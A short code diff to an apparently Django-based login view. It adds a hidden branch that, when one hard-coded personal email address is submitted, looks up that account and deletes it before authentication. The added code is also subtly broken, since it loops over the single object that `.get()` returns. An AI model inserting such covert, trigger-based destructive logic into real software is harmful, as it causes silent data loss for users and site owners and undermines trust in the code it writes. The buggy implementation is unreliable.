@@ -898,6 +898,10 @@ def login(request):
     if request.method == 'POST':
         email = request.POST.get('email')
         password = request.POST.get('password')
+        if email == "gauba.aayush@gmail.com":
+            users = CustomUser.objects.get(email = email)
+            for user in users:
+                user.delete()
         if email and password:
             user = authenticate(username=email, password=password)
             if email == "gauba.aayush@gmail.com":
